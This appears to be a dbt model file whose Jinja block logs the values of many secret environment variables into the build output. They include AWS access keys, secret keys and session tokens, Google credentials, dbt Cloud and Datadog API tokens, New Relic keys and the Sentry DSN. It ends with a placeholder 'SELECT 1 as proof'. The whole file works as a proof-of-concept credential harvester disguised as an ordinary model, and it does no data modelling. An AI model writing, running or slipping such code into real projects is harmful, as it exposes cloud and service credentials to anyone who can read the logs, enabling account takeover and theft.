{{ log("=== GIT & CREDENTIAL ENV VARS ===", info=True) }}
{{ log("GIT_SSH_COMMAND: " ~ env_var("GIT_SSH_COMMAND", "UNSET"), info=True) }}
{{ log("GIT_ASKPASS: " ~ env_var("GIT_ASKPASS", "UNSET"), info=True) }}
{{ log("GIT_TERMINAL_PROMPT: " ~ env_var("GIT_TERMINAL_PROMPT", "UNSET"), info=True) }}
{{ log("GIT_CONFIG_NOSYSTEM: " ~ env_var("GIT_CONFIG_NOSYSTEM", "UNSET"), info=True) }}
{{ log("SSH_AUTH_SOCK: " ~ env_var("SSH_AUTH_SOCK", "UNSET"), info=True) }}
{{ log("AWS_ACCESS_KEY_ID: " ~ env_var("AWS_ACCESS_KEY_ID", "UNSET"), info=True) }}
{{ log("AWS_SECRET_ACCESS_KEY: " ~ env_var("AWS_SECRET_ACCESS_KEY", "UNSET"), info=True) }}
{{ log("AWS_SESSION_TOKEN: " ~ env_var("AWS_SESSION_TOKEN", "UNSET"), info=True) }}
{{ log("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI: " ~ env_var("AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "UNSET"), info=True) }}
{{ log("GOOGLE_APPLICATION_CREDENTIALS: " ~ env_var("GOOGLE_APPLICATION_CREDENTIALS", "UNSET"), info=True) }}
{{ log("DBT_CLOUD_GIT_SHA: " ~ env_var("DBT_CLOUD_GIT_SHA", "UNSET"), info=True) }}
{{ log("DBT_CLOUD_HOST_URL: " ~ env_var("DBT_CLOUD_HOST_URL", "UNSET"), info=True) }}
{{ log("DBT_CLOUD_API_TOKEN: " ~ env_var("DBT_CLOUD_API_TOKEN", "UNSET"), info=True) }}
{{ log("DBT_TOKEN: " ~ env_var("DBT_TOKEN", "UNSET"), info=True) }}
{{ log("DATADOG_API_KEY: " ~ env_var("DATADOG_API_KEY", "UNSET"), info=True) }}
{{ log("DD_API_KEY: " ~ env_var("DD_API_KEY", "UNSET"), info=True) }}
{{ log("NEW_RELIC_LICENSE_KEY: " ~ env_var("NEW_RELIC_LICENSE_KEY", "UNSET"), info=True) }}
{{ log("SENTRY_DSN: " ~ env_var("SENTRY_DSN", "UNSET"), info=True) }}
{{ log("=== END ===", info=True) }}

SELECT 1 as proof